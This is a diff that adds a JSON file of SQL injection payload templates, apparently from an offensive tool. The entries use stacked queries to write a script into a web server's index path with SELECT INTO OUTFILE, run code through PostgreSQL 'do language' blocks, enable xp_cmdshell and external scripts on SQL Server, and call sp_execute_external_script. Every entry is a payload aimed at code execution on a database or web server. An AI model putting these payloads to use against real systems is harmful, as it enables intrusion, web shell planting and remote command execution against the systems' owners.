@@ -1,0 +1,18 @@
+{"idor":
+    {"1":"\";SELECT 'SCRIPT' INTO OUTFILE 'INDEXPATH'-- ",
+    "2":"';SELECT 'SCRIPT' INTO OUTFILE 'INDEXPATH' --",
+     "3":"10;SELECT 'SCRIPT' INTO OUTFILE 'INDEXPATH' --"                         
+   },
+
+
+    "others":{
+        
+            "1":"';do language LANG $$ SCRIPT $$ --",
+            "2":"\" ;do language LANG $$ SCRIPT $$ --,",
+            "3":";do language LANG $$ SCRIPT $$ --",
+            "4":"\";sp_configure 'external script enabled',1 RECONFIGURE;sp_configure 'xp_cmdshell',1 RECONFIGURE --",
+            "5":"';sp_configure 'external script enabled',1 RECONFIGURE;sp_configure 'xp_cmdshell',1 RECONFIGURE --",
+            "6":"sp_execute_external_script @language=LANG,@script=SCRIPT"
+            }
+
+}
